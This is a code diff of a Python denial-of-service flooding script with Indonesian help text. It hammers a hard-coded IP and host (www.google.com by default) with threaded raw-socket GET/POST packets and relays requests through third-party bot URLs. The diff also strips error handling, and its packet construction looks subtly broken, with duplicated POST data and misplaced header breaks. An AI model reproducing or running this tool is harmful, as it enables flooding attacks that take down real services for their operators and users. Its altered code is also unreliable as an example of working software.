@@ -11,7 +11,7 @@ from colorama import Fore, Style, init
 
 # GET / POST
 def sedot_parameters():
-    global ip, host, port, thr, item, referer, uri, path, method, isbot, data_post
+    global ip, host, port, thr, item, referer, uri, path, method, isbot
     ip = "118.98.73.214" 
     host = "www.google.com"
     port = 80
@@ -81,15 +81,16 @@ v ^              \|_______|\|__|\|__|\___/ /        \|_______|\|__|\|__|       |
 v ^                                 \|___|/                                                        ^ v
 v ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ v                                                                  
 vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv                                                                         
-    ________________________________________________________________________________________________
-    | -s or --host = "www.google.com"                                                              |
-    | -p or --port = 80 > 80 (http) or 443 (htttps)                                                |
-    | -t or --turbo  = 200 > default 200                                                           |
-    | -a or --path = "/" > specific attack                                                         |
-    | -u or --uri = "/" > location/page where the website won't redirect anymore, e.g.: /index.jsp |
-    | -m or --method = "GET" > GET / POST                                                          |
-    | -d or --data = "" > used only for method = POST, e.g.: user=test&pass=test                   |
-    ------------------------------------------------------------------------------------------------  
+
+    __________________________________________________________________________________________
+    | -s or --host = "www.google.com"                                                        |
+    | -p or --port = 80 > 80 (http) or 443 (htttps)                                          |
+    | -t or --turbo  = 200 > default 200                                                     |
+    | -a or --path = "/" > serangan spesifik                                                 |
+    | -u or --uri = "/" > lokasi/halaman dimana website gk redirect lgi misalnya: /index.jsp |
+    | -m or --method = "GET" > GET / POST                                                    |
+    | -d or --data = "" > dipakai hanya untuk method = POST, misalnya: user=test&pass=test   |
+    ------------------------------------------------------------------------------------------  
     ''')
     sys.exit()
 
@@ -107,7 +108,7 @@ def user_agent():
     uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
     uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
     uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
     uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
     uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
     uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
@@ -120,8 +121,7 @@ def bot_hammering(url):
             sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
             time.sleep(.1)
-    except Exception as e:
-        print(Fore.RED + f"Error in bot_hammering: {e}")
+    except:
         time.sleep(.1)
 
 def down_it(item):
@@ -133,15 +133,11 @@ def down_it(item):
                 referer = "https://"
 
             if method == "GET":
-                packet = str("GET " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\nUser-Agent: " + random.choice(uagent) + "\n\n").encode('utf-8')
+                packet = str("GET " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data_post).encode('utf-8')
             elif method == "POST":
-                if not data_post:
-                    print(Fore.RED + "Error: data_post cannot be empty for POST requests.")
-                    continue
-                packet = str("POST " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\nUser-Agent: " + random.choice(uagent) + "\n" + data_post + "\n\n").encode('utf-8')
+                packet = str("POST " + path + " HTTP/1.1\nReferer: " + referer + host + uri + "\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data_post + "\n\n" + data_post).encode('utf-8')
             else:
-                print(Fore.RED + "Error: Unsupported method.")
-                continue
+                print("error detected")
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, int(port)))
@@ -151,29 +147,33 @@ def down_it(item):
                 sys.stdout.write('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b')
             else:
                 s.shutdown(1)
-                print(Fore.YELLOW + "shut<->down")
+                print("shut<->down")
             time.sleep(.1)
     except socket.error as e:
-        print(Fore.RED + f"No connection! Server may be down. Error: {e}")
+        print("no connection! server maybe down")
         time.sleep(.1)
 
 def dos():
     while True:
         item = q.get()
-        url = random.choice(bots) + "t" + str(random.randint(0, 1000))
-        threading.Thread(target=bot_hammering, args=(url,)).start()
+        down_it(item)
+        q.task_done()
 
 def dos2():
     while True:
         item = w.get()
-        down_it(item)
+        bot_hammering(random.choice(bots) + ip)
+        w.task_done()
 
 def main():
     sedot_parameters()
     user_agent()
     my_bots()
     
-    print(Fore.GREEN + f"Starting attack on {host} on port {port}...")
+    print(Fore.GREEN + "IP Target: ", host)
+    print(Fore.GREEN + "Port Target: ", port)
+    print(Fore.GREEN + "Attacking...")
+
     for i in range(thr):
         t = threading.Thread(target=dos)
         t.daemon = True
@@ -184,15 +184,12 @@ def main():
         t2.daemon = True
         t2.start()
         
-    # Filling the queues
     while True:
-        if not q.full():
-            q.put("1")
-        if not w.full():
-            w.put("2")
+        q.put("1")
+        w.put("2")
         time.sleep(0.1)
 
 if __name__ == '__main__':
-    q = Queue(maxsize=1000)
-    w = Queue(maxsize=1000)
+    q = Queue()
+    w = Queue()
     main()
